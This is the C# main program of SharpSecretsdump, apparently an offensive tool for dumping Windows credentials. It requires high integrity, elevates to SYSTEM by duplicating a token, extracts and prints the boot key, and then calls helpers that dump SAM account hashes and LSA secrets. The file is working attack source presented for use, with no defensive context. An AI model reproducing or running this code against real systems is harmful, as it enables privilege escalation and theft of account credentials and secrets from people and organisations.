using System;

namespace SharpSecretsdump
{
    class Program
    {
        static void Main(string[] args)
        {
            bool alreadySystem = false;

            if (!Helpers.IsHighIntegrity())
            {
                Console.WriteLine("You need to be in high integrity to extract LSA secrets!");
                return;
            }
            else
            {
                string currentName = System.Security.Principal.WindowsIdentity.GetCurrent().Name;
                bool isSytem = System.Security.Principal.WindowsIdentity.GetCurrent().IsSystem;

                if (isSytem)
                {
                    alreadySystem = true;
                }
                else
                {
                    // elevated but not system, so gotta GetSystem() first
                    //Console.WriteLine("[*] Elevating to SYSTEM via token duplication for LSA secret retrieval");
                    if (Helpers.GetSystem() == false)
                    {
                        Console.WriteLine($"Failed to elevate: {currentName}");
                        return;
                    }
                }
            }

            byte[] bootkey = LSADump.GetBootKey();

            Console.WriteLine($"[*] Target system bootKey: 0x{BitConverter.ToString(bootkey).Replace("-", "").ToLower()}");

            Helpers.GetSamAccounts(bootkey);
            Helpers.GetLsaSecrets(bootkey);

            if (!alreadySystem)
            {
                Interop.RevertToSelf();
            }
        }
    }
}
